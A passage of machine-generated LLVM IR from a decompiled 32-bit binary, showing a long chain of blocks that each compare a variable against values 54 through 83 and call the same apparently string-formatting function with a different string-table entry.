dec_label_pc_804ac0d:                             ; preds = %dec_label_pc_804abd7, %dec_label_pc_804abdd
  %v13_804ac0d = icmp eq i32 %v2_804a0a2, 54
  %v1_804ac11 = icmp eq i1 %v13_804ac0d, false
  br i1 %v1_804ac11, label %dec_label_pc_804ac43, label %dec_label_pc_804ac13

dec_label_pc_804ac13:                             ; preds = %dec_label_pc_804ac0d
  %v0_804ac13 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ac13 = zext i8 %v0_804ac13 to i32
  store i32 %v1_804ac13, i32* @edx, align 4
  %v0_804ac1d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ac1d = zext i8 %v0_804ac1d to i32
  %v2_804ac2c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac2c, i32* @ebx, align 4
  %v5_804ac3e = call i32 @function_8048c55(i32 %v2_804ac2c, i32 ptrtoint ([14 x i8]* @global_var_805aca5.97 to i32), i32 %v1_804ac1d, i32 %v1_804ac13)
  br label %dec_label_pc_804ac43

dec_label_pc_804ac43:                             ; preds = %dec_label_pc_804ac0d, %dec_label_pc_804ac13
  %v13_804ac43 = icmp eq i32 %v2_804a0a2, 55
  %v1_804ac47 = icmp eq i1 %v13_804ac43, false
  br i1 %v1_804ac47, label %dec_label_pc_804ac79, label %dec_label_pc_804ac49

dec_label_pc_804ac49:                             ; preds = %dec_label_pc_804ac43
  %v0_804ac49 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ac49 = zext i8 %v0_804ac49 to i32
  store i32 %v1_804ac49, i32* @edx, align 4
  %v0_804ac53 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ac53 = zext i8 %v0_804ac53 to i32
  %v2_804ac62 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac62, i32* @ebx, align 4
  %v5_804ac74 = call i32 @function_8048c55(i32 %v2_804ac62, i32 ptrtoint ([14 x i8]* @global_var_805acb3.98 to i32), i32 %v1_804ac53, i32 %v1_804ac49)
  br label %dec_label_pc_804ac79

dec_label_pc_804ac79:                             ; preds = %dec_label_pc_804ac43, %dec_label_pc_804ac49
  %v13_804ac79 = icmp eq i32 %v2_804a0a2, 56
  %v1_804ac7d = icmp eq i1 %v13_804ac79, false
  br i1 %v1_804ac7d, label %dec_label_pc_804acaf, label %dec_label_pc_804ac7f

dec_label_pc_804ac7f:                             ; preds = %dec_label_pc_804ac79
  %v0_804ac7f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ac7f = zext i8 %v0_804ac7f to i32
  store i32 %v1_804ac7f, i32* @edx, align 4
  %v0_804ac89 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ac89 = zext i8 %v0_804ac89 to i32
  %v2_804ac98 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac98, i32* @ebx, align 4
  %v5_804acaa = call i32 @function_8048c55(i32 %v2_804ac98, i32 ptrtoint ([14 x i8]* @global_var_805acc1.99 to i32), i32 %v1_804ac89, i32 %v1_804ac7f)
  br label %dec_label_pc_804acaf

dec_label_pc_804acaf:                             ; preds = %dec_label_pc_804ac79, %dec_label_pc_804ac7f
  %v13_804acaf = icmp eq i32 %v2_804a0a2, 57
  %v1_804acb3 = icmp eq i1 %v13_804acaf, false
  br i1 %v1_804acb3, label %dec_label_pc_804ace5, label %dec_label_pc_804acb5

dec_label_pc_804acb5:                             ; preds = %dec_label_pc_804acaf
  %v0_804acb5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804acb5 = zext i8 %v0_804acb5 to i32
  store i32 %v1_804acb5, i32* @edx, align 4
  %v0_804acbf = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804acbf = zext i8 %v0_804acbf to i32
  %v2_804acce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acce, i32* @ebx, align 4
  %v5_804ace0 = call i32 @function_8048c55(i32 %v2_804acce, i32 ptrtoint ([14 x i8]* @global_var_805accf.100 to i32), i32 %v1_804acbf, i32 %v1_804acb5)
  br label %dec_label_pc_804ace5

dec_label_pc_804ace5:                             ; preds = %dec_label_pc_804acaf, %dec_label_pc_804acb5
  %v13_804ace5 = icmp eq i32 %v2_804a0a2, 58
  %v1_804ace9 = icmp eq i1 %v13_804ace5, false
  br i1 %v1_804ace9, label %dec_label_pc_804ad1b, label %dec_label_pc_804aceb

dec_label_pc_804aceb:                             ; preds = %dec_label_pc_804ace5
  %v0_804aceb = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aceb = zext i8 %v0_804aceb to i32
  store i32 %v1_804aceb, i32* @edx, align 4
  %v0_804acf5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804acf5 = zext i8 %v0_804acf5 to i32
  %v2_804ad04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad04, i32* @ebx, align 4
  %v5_804ad16 = call i32 @function_8048c55(i32 %v2_804ad04, i32 ptrtoint ([14 x i8]* @global_var_805acdd.101 to i32), i32 %v1_804acf5, i32 %v1_804aceb)
  br label %dec_label_pc_804ad1b

dec_label_pc_804ad1b:                             ; preds = %dec_label_pc_804ace5, %dec_label_pc_804aceb
  %v13_804ad1b = icmp eq i32 %v2_804a0a2, 59
  %v1_804ad1f = icmp eq i1 %v13_804ad1b, false
  br i1 %v1_804ad1f, label %dec_label_pc_804ad51, label %dec_label_pc_804ad21

dec_label_pc_804ad21:                             ; preds = %dec_label_pc_804ad1b
  %v0_804ad21 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ad21 = zext i8 %v0_804ad21 to i32
  store i32 %v1_804ad21, i32* @edx, align 4
  %v0_804ad2b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ad2b = zext i8 %v0_804ad2b to i32
  %v2_804ad3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad3a, i32* @ebx, align 4
  %v5_804ad4c = call i32 @function_8048c55(i32 %v2_804ad3a, i32 ptrtoint ([14 x i8]* @global_var_805aceb.102 to i32), i32 %v1_804ad2b, i32 %v1_804ad21)
  br label %dec_label_pc_804ad51

dec_label_pc_804ad51:                             ; preds = %dec_label_pc_804ad1b, %dec_label_pc_804ad21
  %v13_804ad51 = icmp eq i32 %v2_804a0a2, 60
  %v1_804ad55 = icmp eq i1 %v13_804ad51, false
  br i1 %v1_804ad55, label %dec_label_pc_804ad87, label %dec_label_pc_804ad57

dec_label_pc_804ad57:                             ; preds = %dec_label_pc_804ad51
  %v0_804ad57 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ad57 = zext i8 %v0_804ad57 to i32
  store i32 %v1_804ad57, i32* @edx, align 4
  %v0_804ad61 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ad61 = zext i8 %v0_804ad61 to i32
  %v2_804ad70 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad70, i32* @ebx, align 4
  %v5_804ad82 = call i32 @function_8048c55(i32 %v2_804ad70, i32 ptrtoint ([13 x i8]* @global_var_805acf9.103 to i32), i32 %v1_804ad61, i32 %v1_804ad57)
  br label %dec_label_pc_804ad87

dec_label_pc_804ad87:                             ; preds = %dec_label_pc_804ad51, %dec_label_pc_804ad57
  %v13_804ad87 = icmp eq i32 %v2_804a0a2, 61
  %v1_804ad8b = icmp eq i1 %v13_804ad87, false
  br i1 %v1_804ad8b, label %dec_label_pc_804adbd, label %dec_label_pc_804ad8d

dec_label_pc_804ad8d:                             ; preds = %dec_label_pc_804ad87
  %v0_804ad8d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ad8d = zext i8 %v0_804ad8d to i32
  store i32 %v1_804ad8d, i32* @edx, align 4
  %v0_804ad97 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ad97 = zext i8 %v0_804ad97 to i32
  %v2_804ada6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ada6, i32* @ebx, align 4
  %v5_804adb8 = call i32 @function_8048c55(i32 %v2_804ada6, i32 ptrtoint ([14 x i8]* @global_var_805ad06.104 to i32), i32 %v1_804ad97, i32 %v1_804ad8d)
  br label %dec_label_pc_804adbd

dec_label_pc_804adbd:                             ; preds = %dec_label_pc_804ad87, %dec_label_pc_804ad8d
  %v13_804adbd = icmp eq i32 %v2_804a0a2, 62
  %v1_804adc1 = icmp eq i1 %v13_804adbd, false
  br i1 %v1_804adc1, label %dec_label_pc_804adf3, label %dec_label_pc_804adc3

dec_label_pc_804adc3:                             ; preds = %dec_label_pc_804adbd
  %v0_804adc3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804adc3 = zext i8 %v0_804adc3 to i32
  store i32 %v1_804adc3, i32* @edx, align 4
  %v0_804adcd = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804adcd = zext i8 %v0_804adcd to i32
  %v2_804addc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804addc, i32* @ebx, align 4
  %v5_804adee = call i32 @function_8048c55(i32 %v2_804addc, i32 ptrtoint ([14 x i8]* @global_var_805ad14.105 to i32), i32 %v1_804adcd, i32 %v1_804adc3)
  br label %dec_label_pc_804adf3

dec_label_pc_804adf3:                             ; preds = %dec_label_pc_804adbd, %dec_label_pc_804adc3
  %v13_804adf3 = icmp eq i32 %v2_804a0a2, 63
  %v1_804adf7 = icmp eq i1 %v13_804adf3, false
  br i1 %v1_804adf7, label %dec_label_pc_804ae29, label %dec_label_pc_804adf9

dec_label_pc_804adf9:                             ; preds = %dec_label_pc_804adf3
  %v0_804adf9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804adf9 = zext i8 %v0_804adf9 to i32
  store i32 %v1_804adf9, i32* @edx, align 4
  %v0_804ae03 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ae03 = zext i8 %v0_804ae03 to i32
  %v2_804ae12 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae12, i32* @ebx, align 4
  %v5_804ae24 = call i32 @function_8048c55(i32 %v2_804ae12, i32 ptrtoint ([14 x i8]* @global_var_805ad22.106 to i32), i32 %v1_804ae03, i32 %v1_804adf9)
  br label %dec_label_pc_804ae29

dec_label_pc_804ae29:                             ; preds = %dec_label_pc_804adf3, %dec_label_pc_804adf9
  %v10_804ae29 = icmp eq i32 %v2_804a0a2, 64
  %v1_804ae2d = icmp eq i1 %v10_804ae29, false
  br i1 %v1_804ae2d, label %dec_label_pc_804ae5f, label %dec_label_pc_804ae2f

dec_label_pc_804ae2f:                             ; preds = %dec_label_pc_804ae29
  %v0_804ae2f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ae2f = zext i8 %v0_804ae2f to i32
  store i32 %v1_804ae2f, i32* @edx, align 4
  %v0_804ae39 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ae39 = zext i8 %v0_804ae39 to i32
  %v2_804ae48 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae48, i32* @ebx, align 4
  %v5_804ae5a = call i32 @function_8048c55(i32 %v2_804ae48, i32 ptrtoint ([13 x i8]* @global_var_805ad30.107 to i32), i32 %v1_804ae39, i32 %v1_804ae2f)
  br label %dec_label_pc_804ae5f

dec_label_pc_804ae5f:                             ; preds = %dec_label_pc_804ae29, %dec_label_pc_804ae2f
  %v13_804ae5f = icmp eq i32 %v2_804a0a2, 65
  %v1_804ae63 = icmp eq i1 %v13_804ae5f, false
  br i1 %v1_804ae63, label %dec_label_pc_804ae95, label %dec_label_pc_804ae65

dec_label_pc_804ae65:                             ; preds = %dec_label_pc_804ae5f
  %v0_804ae65 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ae65 = zext i8 %v0_804ae65 to i32
  store i32 %v1_804ae65, i32* @edx, align 4
  %v0_804ae6f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ae6f = zext i8 %v0_804ae6f to i32
  %v2_804ae7e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae7e, i32* @ebx, align 4
  %v5_804ae90 = call i32 @function_8048c55(i32 %v2_804ae7e, i32 ptrtoint ([13 x i8]* @global_var_805ad3d.108 to i32), i32 %v1_804ae6f, i32 %v1_804ae65)
  br label %dec_label_pc_804ae95

dec_label_pc_804ae95:                             ; preds = %dec_label_pc_804ae5f, %dec_label_pc_804ae65
  %v13_804ae95 = icmp eq i32 %v2_804a0a2, 66
  %v1_804ae99 = icmp eq i1 %v13_804ae95, false
  br i1 %v1_804ae99, label %dec_label_pc_804aecb, label %dec_label_pc_804ae9b

dec_label_pc_804ae9b:                             ; preds = %dec_label_pc_804ae95
  %v0_804ae9b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ae9b = zext i8 %v0_804ae9b to i32
  store i32 %v1_804ae9b, i32* @edx, align 4
  %v0_804aea5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aea5 = zext i8 %v0_804aea5 to i32
  %v2_804aeb4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aeb4, i32* @ebx, align 4
  %v5_804aec6 = call i32 @function_8048c55(i32 %v2_804aeb4, i32 ptrtoint ([13 x i8]* @global_var_805ad4a.109 to i32), i32 %v1_804aea5, i32 %v1_804ae9b)
  br label %dec_label_pc_804aecb

dec_label_pc_804aecb:                             ; preds = %dec_label_pc_804ae95, %dec_label_pc_804ae9b
  %v13_804aecb = icmp eq i32 %v2_804a0a2, 67
  %v1_804aecf = icmp eq i1 %v13_804aecb, false
  br i1 %v1_804aecf, label %dec_label_pc_804af01, label %dec_label_pc_804aed1

dec_label_pc_804aed1:                             ; preds = %dec_label_pc_804aecb
  %v0_804aed1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aed1 = zext i8 %v0_804aed1 to i32
  store i32 %v1_804aed1, i32* @edx, align 4
  %v0_804aedb = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aedb = zext i8 %v0_804aedb to i32
  %v2_804aeea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aeea, i32* @ebx, align 4
  %v5_804aefc = call i32 @function_8048c55(i32 %v2_804aeea, i32 ptrtoint ([12 x i8]* @global_var_805ad57.110 to i32), i32 %v1_804aedb, i32 %v1_804aed1)
  br label %dec_label_pc_804af01

dec_label_pc_804af01:                             ; preds = %dec_label_pc_804aecb, %dec_label_pc_804aed1
  %v13_804af01 = icmp eq i32 %v2_804a0a2, 68
  %v1_804af05 = icmp eq i1 %v13_804af01, false
  br i1 %v1_804af05, label %dec_label_pc_804af37, label %dec_label_pc_804af07

dec_label_pc_804af07:                             ; preds = %dec_label_pc_804af01
  %v0_804af07 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804af07 = zext i8 %v0_804af07 to i32
  store i32 %v1_804af07, i32* @edx, align 4
  %v0_804af11 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804af11 = zext i8 %v0_804af11 to i32
  %v2_804af20 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af20, i32* @ebx, align 4
  %v5_804af32 = call i32 @function_8048c55(i32 %v2_804af20, i32 ptrtoint ([13 x i8]* @global_var_805ad63.111 to i32), i32 %v1_804af11, i32 %v1_804af07)
  br label %dec_label_pc_804af37

dec_label_pc_804af37:                             ; preds = %dec_label_pc_804af01, %dec_label_pc_804af07
  %v13_804af37 = icmp eq i32 %v2_804a0a2, 69
  %v1_804af3b = icmp eq i1 %v13_804af37, false
  br i1 %v1_804af3b, label %dec_label_pc_804af6d, label %dec_label_pc_804af3d

dec_label_pc_804af3d:                             ; preds = %dec_label_pc_804af37
  %v0_804af3d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804af3d = zext i8 %v0_804af3d to i32
  store i32 %v1_804af3d, i32* @edx, align 4
  %v0_804af47 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804af47 = zext i8 %v0_804af47 to i32
  %v2_804af56 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af56, i32* @ebx, align 4
  %v5_804af68 = call i32 @function_8048c55(i32 %v2_804af56, i32 ptrtoint ([13 x i8]* @global_var_805ad70.112 to i32), i32 %v1_804af47, i32 %v1_804af3d)
  br label %dec_label_pc_804af6d

dec_label_pc_804af6d:                             ; preds = %dec_label_pc_804af37, %dec_label_pc_804af3d
  %v13_804af6d = icmp eq i32 %v2_804a0a2, 70
  %v1_804af71 = icmp eq i1 %v13_804af6d, false
  br i1 %v1_804af71, label %dec_label_pc_804afa3, label %dec_label_pc_804af73

dec_label_pc_804af73:                             ; preds = %dec_label_pc_804af6d
  %v0_804af73 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804af73 = zext i8 %v0_804af73 to i32
  store i32 %v1_804af73, i32* @edx, align 4
  %v0_804af7d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804af7d = zext i8 %v0_804af7d to i32
  %v2_804af8c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af8c, i32* @ebx, align 4
  %v5_804af9e = call i32 @function_8048c55(i32 %v2_804af8c, i32 ptrtoint ([13 x i8]* @global_var_805ad7d.113 to i32), i32 %v1_804af7d, i32 %v1_804af73)
  br label %dec_label_pc_804afa3

dec_label_pc_804afa3:                             ; preds = %dec_label_pc_804af6d, %dec_label_pc_804af73
  %v13_804afa3 = icmp eq i32 %v2_804a0a2, 71
  %v1_804afa7 = icmp eq i1 %v13_804afa3, false
  br i1 %v1_804afa7, label %dec_label_pc_804afd9, label %dec_label_pc_804afa9

dec_label_pc_804afa9:                             ; preds = %dec_label_pc_804afa3
  %v0_804afa9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804afa9 = zext i8 %v0_804afa9 to i32
  store i32 %v1_804afa9, i32* @edx, align 4
  %v0_804afb3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804afb3 = zext i8 %v0_804afb3 to i32
  %v2_804afc2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afc2, i32* @ebx, align 4
  %v5_804afd4 = call i32 @function_8048c55(i32 %v2_804afc2, i32 ptrtoint ([13 x i8]* @global_var_805ad8a.114 to i32), i32 %v1_804afb3, i32 %v1_804afa9)
  br label %dec_label_pc_804afd9

dec_label_pc_804afd9:                             ; preds = %dec_label_pc_804afa3, %dec_label_pc_804afa9
  %v13_804afd9 = icmp eq i32 %v2_804a0a2, 72
  %v1_804afdd = icmp eq i1 %v13_804afd9, false
  br i1 %v1_804afdd, label %dec_label_pc_804b00f, label %dec_label_pc_804afdf

dec_label_pc_804afdf:                             ; preds = %dec_label_pc_804afd9
  %v0_804afdf = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804afdf = zext i8 %v0_804afdf to i32
  store i32 %v1_804afdf, i32* @edx, align 4
  %v0_804afe9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804afe9 = zext i8 %v0_804afe9 to i32
  %v2_804aff8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aff8, i32* @ebx, align 4
  %v5_804b00a = call i32 @function_8048c55(i32 %v2_804aff8, i32 ptrtoint ([13 x i8]* @global_var_805ad97.115 to i32), i32 %v1_804afe9, i32 %v1_804afdf)
  br label %dec_label_pc_804b00f

dec_label_pc_804b00f:                             ; preds = %dec_label_pc_804afd9, %dec_label_pc_804afdf
  %v13_804b00f = icmp eq i32 %v2_804a0a2, 73
  %v1_804b013 = icmp eq i1 %v13_804b00f, false
  br i1 %v1_804b013, label %dec_label_pc_804b045, label %dec_label_pc_804b015

dec_label_pc_804b015:                             ; preds = %dec_label_pc_804b00f
  %v0_804b015 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b015 = zext i8 %v0_804b015 to i32
  store i32 %v1_804b015, i32* @edx, align 4
  %v0_804b01f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b01f = zext i8 %v0_804b01f to i32
  %v2_804b02e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b02e, i32* @ebx, align 4
  %v5_804b040 = call i32 @function_8048c55(i32 %v2_804b02e, i32 ptrtoint ([13 x i8]* @global_var_805ada4.116 to i32), i32 %v1_804b01f, i32 %v1_804b015)
  br label %dec_label_pc_804b045

dec_label_pc_804b045:                             ; preds = %dec_label_pc_804b00f, %dec_label_pc_804b015
  %v13_804b045 = icmp eq i32 %v2_804a0a2, 74
  %v1_804b049 = icmp eq i1 %v13_804b045, false
  br i1 %v1_804b049, label %dec_label_pc_804b07b, label %dec_label_pc_804b04b

dec_label_pc_804b04b:                             ; preds = %dec_label_pc_804b045
  %v0_804b04b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b04b = zext i8 %v0_804b04b to i32
  store i32 %v1_804b04b, i32* @edx, align 4
  %v0_804b055 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b055 = zext i8 %v0_804b055 to i32
  %v2_804b064 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b064, i32* @ebx, align 4
  %v5_804b076 = call i32 @function_8048c55(i32 %v2_804b064, i32 ptrtoint ([12 x i8]* @global_var_805adb1.117 to i32), i32 %v1_804b055, i32 %v1_804b04b)
  br label %dec_label_pc_804b07b

dec_label_pc_804b07b:                             ; preds = %dec_label_pc_804b045, %dec_label_pc_804b04b
  %v13_804b07b = icmp eq i32 %v2_804a0a2, 75
  %v1_804b07f = icmp eq i1 %v13_804b07b, false
  br i1 %v1_804b07f, label %dec_label_pc_804b0b1, label %dec_label_pc_804b081

dec_label_pc_804b081:                             ; preds = %dec_label_pc_804b07b
  %v0_804b081 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b081 = zext i8 %v0_804b081 to i32
  store i32 %v1_804b081, i32* @edx, align 4
  %v0_804b08b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b08b = zext i8 %v0_804b08b to i32
  %v2_804b09a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b09a, i32* @ebx, align 4
  %v5_804b0ac = call i32 @function_8048c55(i32 %v2_804b09a, i32 ptrtoint ([14 x i8]* @global_var_805adbd.118 to i32), i32 %v1_804b08b, i32 %v1_804b081)
  br label %dec_label_pc_804b0b1

dec_label_pc_804b0b1:                             ; preds = %dec_label_pc_804b07b, %dec_label_pc_804b081
  %v13_804b0b1 = icmp eq i32 %v2_804a0a2, 76
  %v1_804b0b5 = icmp eq i1 %v13_804b0b1, false
  br i1 %v1_804b0b5, label %dec_label_pc_804b0e7, label %dec_label_pc_804b0b7

dec_label_pc_804b0b7:                             ; preds = %dec_label_pc_804b0b1
  %v0_804b0b7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b0b7 = zext i8 %v0_804b0b7 to i32
  store i32 %v1_804b0b7, i32* @edx, align 4
  %v0_804b0c1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b0c1 = zext i8 %v0_804b0c1 to i32
  %v2_804b0d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0d0, i32* @ebx, align 4
  %v5_804b0e2 = call i32 @function_8048c55(i32 %v2_804b0d0, i32 ptrtoint ([11 x i8]* @global_var_805adcb.119 to i32), i32 %v1_804b0c1, i32 %v1_804b0b7)
  br label %dec_label_pc_804b0e7

dec_label_pc_804b0e7:                             ; preds = %dec_label_pc_804b0b1, %dec_label_pc_804b0b7
  %v13_804b0e7 = icmp eq i32 %v2_804a0a2, 77
  %v1_804b0eb = icmp eq i1 %v13_804b0e7, false
  br i1 %v1_804b0eb, label %dec_label_pc_804b11d, label %dec_label_pc_804b0ed

dec_label_pc_804b0ed:                             ; preds = %dec_label_pc_804b0e7
  %v0_804b0ed = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b0ed = zext i8 %v0_804b0ed to i32
  store i32 %v1_804b0ed, i32* @edx, align 4
  %v0_804b0f7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b0f7 = zext i8 %v0_804b0f7 to i32
  %v2_804b106 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b106, i32* @ebx, align 4
  %v5_804b118 = call i32 @function_8048c55(i32 %v2_804b106, i32 ptrtoint ([13 x i8]* @global_var_805add6.120 to i32), i32 %v1_804b0f7, i32 %v1_804b0ed)
  br label %dec_label_pc_804b11d

dec_label_pc_804b11d:                             ; preds = %dec_label_pc_804b0e7, %dec_label_pc_804b0ed
  %v13_804b11d = icmp eq i32 %v2_804a0a2, 78
  %v1_804b121 = icmp eq i1 %v13_804b11d, false
  br i1 %v1_804b121, label %dec_label_pc_804b153, label %dec_label_pc_804b123

dec_label_pc_804b123:                             ; preds = %dec_label_pc_804b11d
  %v0_804b123 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b123 = zext i8 %v0_804b123 to i32
  store i32 %v1_804b123, i32* @edx, align 4
  %v0_804b12d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b12d = zext i8 %v0_804b12d to i32
  %v2_804b13c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b13c, i32* @ebx, align 4
  %v5_804b14e = call i32 @function_8048c55(i32 %v2_804b13c, i32 ptrtoint ([11 x i8]* @global_var_805ade3.121 to i32), i32 %v1_804b12d, i32 %v1_804b123)
  br label %dec_label_pc_804b153

dec_label_pc_804b153:                             ; preds = %dec_label_pc_804b11d, %dec_label_pc_804b123
  %v13_804b153 = icmp eq i32 %v2_804a0a2, 79
  %v1_804b157 = icmp eq i1 %v13_804b153, false
  br i1 %v1_804b157, label %dec_label_pc_804b189, label %dec_label_pc_804b159

dec_label_pc_804b159:                             ; preds = %dec_label_pc_804b153
  %v0_804b159 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b159 = zext i8 %v0_804b159 to i32
  store i32 %v1_804b159, i32* @edx, align 4
  %v0_804b163 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b163 = zext i8 %v0_804b163 to i32
  %v2_804b172 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b172, i32* @ebx, align 4
  %v5_804b184 = call i32 @function_8048c55(i32 %v2_804b172, i32 ptrtoint ([13 x i8]* @global_var_805adee.122 to i32), i32 %v1_804b163, i32 %v1_804b159)
  br label %dec_label_pc_804b189

dec_label_pc_804b189:                             ; preds = %dec_label_pc_804b153, %dec_label_pc_804b159
  %v10_804b189 = icmp eq i32 %v2_804a0a2, 80
  %v1_804b18d = icmp eq i1 %v10_804b189, false
  br i1 %v1_804b18d, label %dec_label_pc_804b1bf, label %dec_label_pc_804b18f

dec_label_pc_804b18f:                             ; preds = %dec_label_pc_804b189
  %v0_804b18f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b18f = zext i8 %v0_804b18f to i32
  store i32 %v1_804b18f, i32* @edx, align 4
  %v0_804b199 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b199 = zext i8 %v0_804b199 to i32
  %v2_804b1a8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1a8, i32* @ebx, align 4
  %v5_804b1ba = call i32 @function_8048c55(i32 %v2_804b1a8, i32 ptrtoint ([12 x i8]* @global_var_805adfb.123 to i32), i32 %v1_804b199, i32 %v1_804b18f)
  br label %dec_label_pc_804b1bf

dec_label_pc_804b1bf:                             ; preds = %dec_label_pc_804b189, %dec_label_pc_804b18f
  %v13_804b1bf = icmp eq i32 %v2_804a0a2, 81
  %v1_804b1c3 = icmp eq i1 %v13_804b1bf, false
  br i1 %v1_804b1c3, label %dec_label_pc_804b1f5, label %dec_label_pc_804b1c5

dec_label_pc_804b1c5:                             ; preds = %dec_label_pc_804b1bf
  %v0_804b1c5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b1c5 = zext i8 %v0_804b1c5 to i32
  store i32 %v1_804b1c5, i32* @edx, align 4
  %v0_804b1cf = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b1cf = zext i8 %v0_804b1cf to i32
  %v2_804b1de = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1de, i32* @ebx, align 4
  %v5_804b1f0 = call i32 @function_8048c55(i32 %v2_804b1de, i32 ptrtoint ([13 x i8]* @global_var_805ae07.124 to i32), i32 %v1_804b1cf, i32 %v1_804b1c5)
  br label %dec_label_pc_804b1f5

dec_label_pc_804b1f5:                             ; preds = %dec_label_pc_804b1bf, %dec_label_pc_804b1c5
  %v13_804b1f5 = icmp eq i32 %v2_804a0a2, 82
  %v1_804b1f9 = icmp eq i1 %v13_804b1f5, false
  br i1 %v1_804b1f9, label %dec_label_pc_804b22b, label %dec_label_pc_804b1fb

dec_label_pc_804b1fb:                             ; preds = %dec_label_pc_804b1f5
  %v0_804b1fb = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b1fb = zext i8 %v0_804b1fb to i32
  store i32 %v1_804b1fb, i32* @edx, align 4
  %v0_804b205 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804b205 = zext i8 %v0_804b205 to i32
  %v2_804b214 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b214, i32* @ebx, align 4
  %v5_804b226 = call i32 @function_8048c55(i32 %v2_804b214, i32 ptrtoint ([13 x i8]* @global_var_805ae14.125 to i32), i32 %v1_804b205, i32 %v1_804b1fb)
  br label %dec_label_pc_804b22b

dec_label_pc_804b22b:                             ; preds = %dec_label_pc_804b1f5, %dec_label_pc_804b1fb
  %v13_804b22b = icmp eq i32 %v2_804a0a2, 83
  %v1_804b22f = icmp eq i1 %v13_804b22b, false
  br i1 %v1_804b22f, label %dec_label_pc_804b261, label %dec_label_pc_804b231

dec_label_pc_804b231:                             ; preds = %dec_label_pc_804b22b
  %v0_804b231 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804b231 = zext i8 %v0_804b231 to i32
  store i32 %v1_804b231, i32* @edx, align 4
